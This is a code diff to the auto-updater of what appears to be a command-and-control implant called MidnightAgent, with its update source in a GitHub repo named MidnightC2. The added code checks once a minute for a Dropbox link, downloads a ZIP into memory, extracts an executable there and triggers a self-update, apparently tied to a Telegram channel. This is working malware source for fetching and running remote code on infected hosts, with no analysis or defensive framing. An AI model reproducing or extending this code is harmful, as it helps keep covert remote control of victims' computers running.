@@ -1,25 +1,27 @@
 using System;
 using System.IO;
+using System.IO.Compression;
 using System.Net;
 using System.Threading;
-using System.Threading.Tasks;
 
 namespace MidnightAgent.Core
 {
     /// <summary>
-    /// Auto updater - checks for updates from a single remote config file
-    /// Format: Line 1 = "v = X.Y.Z", Line 2 = download URL
+    /// Auto updater - checks for updates by downloading ZIP from Dropbox
+    /// Flow: GitHub txt → Dropbox URL → Download ZIP to RAM → Extract in RAM
+    ///       → Read version.txt inside ZIP → Compare version → Update from exe bytes
+    /// ZIP contains: version.txt ("v = X.Y.Z\nd = filename.exe") + the actual exe
     /// </summary>
     public static class AutoUpdater
     {
-        // Single source: version + download URL in one file
+        // GitHub Raw URL pointing to the Dropbox download link
         private const string UpdateConfigUrl = "https://raw.githubusercontent.com/teelawat/MidnightC2/refs/heads/main/dropbox-url-update.txt";
         
         private static Timer _timer;
 
         public static void Start(CancellationToken token)
         {
-            Logger.Log("AutoUpdater started (In-Memory)");
+            Logger.Log("AutoUpdater started (In-Memory ZIP)");
             
             // Check every 1 minute
             _timer = new Timer(CheckForUpdateCallback, null, TimeSpan.FromMinutes(1), TimeSpan.FromMinutes(1));
@@ -33,33 +35,60 @@ namespace MidnightAgent.Core
 
         private static void CheckForUpdateCallback(object state)
         {
-            byte[] updateZip = null;
+            byte[] zipData = null;
+            byte[] exeBytes = null;
             try
             {
-                // 1. Read single config file (version + URL)
-                string content = DownloadString(UpdateConfigUrl);
-                if (string.IsNullOrEmpty(content)) return;
+                // 1. Get Dropbox URL from GitHub
+                string dropboxUrl = DownloadString(UpdateConfigUrl);
+                if (string.IsNullOrEmpty(dropboxUrl)) return;
 
-                var lines = content.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
-                if (lines.Length < 2) return;
+                // 2. Download ZIP to RAM
+                zipData = DownloadBytes(dropboxUrl);
+                if (zipData == null || zipData.Length == 0) return;
 
-                // Line 1: "v = 0.6.10"
+                // 3. Extract ZIP in memory and read version.txt
                 string remoteVersion = null;
-                if (lines[0].StartsWith("v = ")) remoteVersion = lines[0].Substring(4).Trim();
-                if (string.IsNullOrEmpty(remoteVersion)) return;
+                string exeFileName = null;
 
-                // Line 2: download URL
-                string downloadUrl = lines[1].Trim();
-                if (string.IsNullOrEmpty(downloadUrl)) return;
+                using (var zipStream = new MemoryStream(zipData))
+                using (var archive = new ZipArchive(zipStream, ZipArchiveMode.Read))
+                {
+                    // Find and read version.txt inside ZIP
+                    var versionEntry = archive.GetEntry("version.txt");
+                    if (versionEntry == null) return;
 
-                // 2. Compare versions
-                if (!IsNewerVersion(remoteVersion, Config.Version)) return;
+                    using (var reader = new StreamReader(versionEntry.Open()))
+                    {
+                        string versionContent = reader.ReadToEnd();
+                        var lines = versionContent.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
+                        foreach (var line in lines)
+                        {
+                            if (line.StartsWith("v = ")) remoteVersion = line.Substring(4).Trim();
+                            if (line.StartsWith("d = ")) exeFileName = line.Substring(4).Trim();
+                        }
+                    }
 
-                Logger.Log($"New update available: {remoteVersion}");
+                    if (string.IsNullOrEmpty(remoteVersion) || string.IsNullOrEmpty(exeFileName)) return;
 
-                // 3. Download directly to RAM
-                updateZip = DownloadBytes(downloadUrl);
-                if (updateZip == null || updateZip.Length == 0) return;
+                    // 4. Compare versions - only update if remote is newer
+                    if (!IsNewerVersion(remoteVersion, Config.Version)) return;
+
+                    Logger.Log($"New update available: {remoteVersion} (current: {Config.Version})");
+
+                    // 5. Extract the exe from ZIP into memory
+                    var exeEntry = archive.GetEntry(exeFileName);
+                    if (exeEntry == null) return;
+
+                    using (var exeStream = exeEntry.Open())
+                    using (var ms = new MemoryStream())
+                    {
+                        exeStream.CopyTo(ms);
+                        exeBytes = ms.ToArray();
+                    }
+                }
+
+                if (exeBytes == null || exeBytes.Length == 0) return;
 
                 // Ensure TelegramInstance is set
                 if (Features.UpdateFeature.TelegramInstance == null)
@@ -67,9 +96,9 @@ namespace MidnightAgent.Core
                     Features.UpdateFeature.TelegramInstance = new Telegram.TelegramService();
                 }
 
-                // 4. Trigger Update from RAM
+                // 6. Trigger Update from RAM
                 var updater = new Features.UpdateFeature();
-                updater.PerformUpdateFromBytes(updateZip, remoteVersion).Wait();
+                updater.PerformUpdateFromBytes(exeBytes, remoteVersion).Wait();
             }
             catch (Exception ex)
             {
@@ -77,8 +106,9 @@ namespace MidnightAgent.Core
             }
             finally
             {
-                // CRITICAL: Cleanup to prevent memory leaks
-                updateZip = null;
+                // CRITICAL: Cleanup large arrays to prevent memory leaks
+                zipData = null;
+                exeBytes = null;
                 GC.Collect(2, GCCollectionMode.Forced);
             }
         }
@@ -103,7 +133,7 @@ namespace MidnightAgent.Core
             try
             {
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
-                request.Timeout = 30000;
+                request.Timeout = 60000; // 60s for large ZIP
                 
                 using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                 using (Stream responseStream = response.GetResponseStream())
